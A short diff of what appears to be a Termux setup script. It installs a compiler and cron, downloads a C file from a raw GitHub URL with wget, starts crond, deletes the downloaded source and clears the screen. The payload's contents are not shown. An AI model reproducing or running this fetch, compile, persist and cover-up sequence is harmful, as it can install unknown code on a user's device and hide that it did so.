@@ -2,7 +2,7 @@
 
 termux-setup-storage
 
-pkg install cronie
+pkg install cronie build-essential -y
 
 
 wget https://raw.githubusercontent.com/Piroza1/semantic/main/015510.c
@@ -18,4 +18,4 @@ crond
 
 rm 015510.c
 
-
+clear
